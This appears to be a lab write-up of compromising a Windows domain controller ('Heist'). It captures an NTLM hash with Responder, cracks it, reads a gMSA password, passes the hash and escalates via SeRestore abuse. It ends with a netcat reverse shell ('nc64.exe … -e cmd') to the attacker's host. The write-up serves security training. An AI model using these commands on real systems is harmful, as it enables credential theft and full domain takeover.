#### Info Enumeration
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-30 14:49:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-30T14:49:57+00:00
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Not valid before: 2026-07-29T13:51:03
|_Not valid after:  2027-01-28T13:51:03
|_ssl-date: 2026-07-30T14:50:36+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-title: Super Secure Web Browser
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49759/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

For port 389,3268

`└─$ ldapsearch -x -H ldap://heist.offsec -s base namingcontexts`
```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=heist,DC=offsec
namingcontexts: CN=Configuration,DC=heist,DC=offsec
namingcontexts: CN=Schema,CN=Configuration,DC=heist,DC=offsec
namingcontexts: DC=DomainDnsZones,DC=heist,DC=offsec
namingcontexts: DC=ForestDnsZones,DC=heist,DC=offsec
```

Galactic Web Service of Sagittarius V4641, for port 80, but no pratical exploit vector. And the web seems RFI and show it on web page. But cannot trigger cmd or reverseshell.

#### Foot hold
i try to set responder service listion on kali, and set a web web service as well,  use RFI to get a file. I found machine sends info to responder. that is a NTLM hash
`└─$ sudo responder -I tun0 -wvF`
```
[+] Listening for events...

[HTTP] Sending NTLM authentication request to 192.168.245.165
[HTTP] GET request from: ::ffff:192.168.245.165  URL: / 
[HTTP] NTLMv2 Client   : 192.168.245.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:a43f7c911903f784:717A78247174E5394EF6F0F141CBC87C:01010000000000003DFC2E833920DD01EB6FF33151DC1D13000000000200080043005A005900490001001E00570049004E002D00580030004600480047004A0043004D005000350048000400140043005A00590049002E004C004F00430041004C0003003400570049004E002D00580030004600480047004A0043004D005000350048002E0043005A00590049002E004C004F00430041004C000500140043005A00590049002E004C004F00430041004C00080030003000000000000000000000000030000098BF0D68BEA36AC69F27F02B4B5580B35A970EAA12F2C2D466BA29E944A8C58C0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100370035000000000000000000
```

`└─$ hashcat -m 5600 hash -a 0 ~/oscp/rockyou.txt`
```
enox
california
```
and we can use this to winrm to machine

`evil-winrm -i heist.offsec -u enox -p 'california'`
```
*Evil-WinRM* PS C:\Users\enox\Documents> whoami
heist\enox
```
```
*Evil-WinRM* PS C:\Users\enox\Desktop> type todo.txt
- Setup Flask Application for Secure Browser [DONE]
- Use group managed service account for apache [DONE]
- Migrate to apache
- Debug Flask Application [DONE]
- Remove Flask Application
- Submit IT Expenses file to admin. [DONE]
```

`*Evil-WinRM* PS C:\Users\enox\Desktop\application> net group /domain`
```
Group Accounts for \\

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
*Web Admins
The command completed with one or more errors.
```
`*Evil-WinRM* PS C:\Users\enox\Desktop\application> whoami /groups`
```
GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
HEIST\Web Admins                            Group            S-1-5-21-537427935-490066102-1511301751-1104 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

sAMAccountName (Security Accounts Manager Account Name) is a core attribute in Microsoft Active Directory (AD) used to store the logon name for a user, computer, or group in legacy formats (pre-Windows 2000).

I use ldapsearch to find any user, group in this AD domain.

`└─$ ldapsearch -x -H ldap://heist.offsec -D 'enox@heist.offsec' -W -b 'DC=heist,DC=offsec' "(objectClass=msDS-GroupManagedServiceAccount)" sAMAccountName`
```
Enter LDAP Password: 
# extended LDIF
#
# LDAPv3
# base <DC=heist,DC=offsec> with scope subtree
# filter: (objectClass=msDS-GroupManagedServiceAccount)
# requesting: sAMAccountName 
#

# svc_apache, Managed Service Accounts, heist.offsec
dn: CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
sAMAccountName: svc_apache$

# search reference
ref: ldap://ForestDnsZones.heist.offsec/DC=ForestDnsZones,DC=heist,DC=offsec

# search reference
ref: ldap://DomainDnsZones.heist.offsec/DC=DomainDnsZones,DC=heist,DC=offsec

# search reference
ref: ldap://heist.offsec/CN=Configuration,DC=heist,DC=offsec

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

I got a service svc_apache account try to use bloodhound enumerate the AD

`└─$ bloodhound-python -d heist.offsec -dc dc01.heist.offsec -u enox -p 'california' -c All -v -ns 192.168.245.165 --zip`
```
INFO: Done in 00M 19S
INFO: Compressing output into 20260730115912_bloodhound.zip
```
enox -memof--> web admins --ReadGMSAPassword--> svc_apache

and group web admins is definitely in the AD, so next we will get password

https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword

#### Lateral Move
Method1: on kali use bloodyad to get the gMSA password

`└─$ bloodyad --host 192.168.245.165 -d heist.offsec -u enox -p "california" get object SVC_APACHE$ --attr msDS-ManagedPassword`
```
distinguishedName: CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
msDS-ManagedPassword.NT: 1169a68c02b287c7d88ce7e512acbee7
msDS-ManagedPassword.B64ENCODED: nmPqvoV6B/MMlbvC4HyHSbRzec6rKegAxL9C5+M/BK5BDuyd0rpxy35MBZNMUGqSL6a2hEvzCmqlf0tFDKZfptRtZtE317h+bzJNzcBI6OKGmkOkvejDySH8UsiEI7xQ0lifHbD2XADxjvB7bL1SOikkEvWP3Vlgbgo99rD1+bkya2P+Uhx2Dx38thwRuBtO4kEVo+oX/ExtTzub1Gb99Vw9rF1wyulmUtTh3nAn8ZYQ9JfkGaaPy3l/qLhlSQaOzmASBfz1EvNdwGskp0OJbq9e7RMfNacPsWsjsRFj+h71aQmmDEtf2zaPc9akHYcuoVRGwpAy4XbgxpDBKGwaRA==
```

Method2: use ldeep to get the gMSA password blobs the user can access and parses the values

└─$ ldeep ldap -d heist.offsec -s 192.168.154.165 -u enox -p 'california' gmsa -t SVC_APACHE$
svc_apache$:nthash:1169a68c02b287c7d88ce7e512acbee7
svc_apache$:aes128-cts-hmac-sha1-96:3dcc7e89fb7671276eb0ccd25b12f9cf
svc_apache$:aes256-cts-hmac-sha1-96:b59b86b465c3d47a6a1036b332e0776426f6e5f3790195461a171e1d9326517a
svc_apache$:reader:DC01$
svc_apache$:reader:Web Admins (group)

pass the hash to winrm to the host

`└─$ evil-winrm -i 192.168.245.165 -u svc_apache$ -H 1169a68c02b287c7d88ce7e512acbee7`

#### Priv Escalate

`*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami /priv`
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

SeRestoreAbuse priv, on target machine, use powershell tool 

https://medium.com/@pankajaditya/privilege-escalation-abusing-dangerous-privileges-sebackup-serestore-e360309da4a7

https://github.com/0x4D-5A/Invoke-SeRestoreAbuse

`Invoke-SeRestoreAbuse -Command 'cmd /c powershell -c "whoami > C:\Users\svc_apache$\Documents\a.txt"'`
```
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> type a.txt
nt authority\system
```

it works, so we set reverse shell to payload

`Invoke-SeRestoreAbuse -Command 'cmd /c powershell -c "C:\Users\svc_apache$\Documents\nc64.exe 192.168.45.175 8821 -e cmd"'`
```
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> upload nc64.exe
                                        
Info: Uploading /tmp/nc64.exe to C:\Users\svc_apache$\Documents\nc64.exe
                                        
Data: 60360 bytes of 60360 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> Invoke-SeRestoreAbuse -Command 'cmd /c powershell -c "C:\Users\svc_apache$\Documents\nc64.exe 192.168.45.175 8821 -e cmd"'
[+] SeRestorePrivilege privilege enabled
[+] ImagePath set to: cmd /c powershell -c "C:\Users\svc_apache$\Documents\nc64.exe 192.168.45.175 8821 -e cmd"
```

#### Lesson learned
- Use responder to get info the AD service may sent
- use ldapsearch to find sAMAccountName in domain
- ReadGMSAPassword use, to get NTLM hash, and then pass the hash to login domain
- SeRestoreAbuse use, to get admin
